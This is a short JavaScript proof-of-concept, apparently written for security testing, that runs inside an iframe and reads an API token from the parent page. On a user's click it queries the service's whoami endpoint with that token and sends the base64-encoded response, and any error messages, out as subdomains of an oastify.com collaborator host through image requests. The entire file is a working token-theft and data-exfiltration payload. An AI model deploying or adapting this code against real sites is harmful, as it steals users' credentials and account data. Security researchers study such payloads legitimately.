window.parent.console.log('Iframe script running from CDN');
try {
  const token = window.parent.document.querySelector('#gq-api-token').content;
  window.parent.console.log('Token:', token);
  window.addEventListener('click', () => {
    window.parent.console.log('Click triggered');
    fetch('https://greatquestion.co/api/v1/whoami', {
      method: 'GET',
      headers: { 'Authorization': token, 'Accept': '*/*' }
    })
    .then(response => {
      window.parent.console.log('Fetch Status:', response.status, 'Headers:', [...response.headers]);
      return response.json();
    })
    .then(data => {
      window.parent.console.log('API Response:', data);
      let dataStr = JSON.stringify(data).slice(0, 100);
      let exfilUrl = 'http://' + btoa(dataStr) + '.637wc77pz6vrqi1pkykpmpmldcj67wvl.oastify.com';
      window.parent.console.log('Exfil URL:', exfilUrl);
      new Image().src = exfilUrl;
    })
    .catch(err => {
      window.parent.console.error('Fetch Error:', err.message);
      new Image().src = 'http://error.' + btoa(err.message.slice(0, 100)) + '.637wc77pz6vrqi1pkykpmpmldcj67wvl.oastify.com';
    });
  });
} catch (e) {
  window.parent.console.error('Token Access Error:', e.message);
  new Image().src = 'http://error.' + btoa(e.message.slice(0, 100)) + '.637wc77pz6vrqi1pkykpmpmldcj67wvl.oastify.com';
}
